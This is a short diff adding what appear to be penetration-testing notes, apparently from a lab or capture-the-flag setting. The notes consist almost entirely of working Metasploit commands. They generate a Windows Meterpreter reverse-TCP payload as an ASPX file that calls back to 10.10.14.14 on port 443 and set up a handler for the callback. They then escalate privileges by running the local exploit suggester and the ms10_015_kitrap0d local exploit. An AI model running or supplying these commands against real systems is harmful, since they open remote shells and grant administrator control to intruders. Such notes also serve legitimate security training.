@@ -1,1 +1,16 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > met_rev_443.aspx
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
 
+Post Exploitation with metasploit:
+
+it will suggest some exploits:
+
+use post/multi/recon/local_exploit_suggester
+set session 1
+run
+
+Run one of the suggested exploit
+use exploit/windows/local/ms10_015_kitrap0d
+set session 1
+run
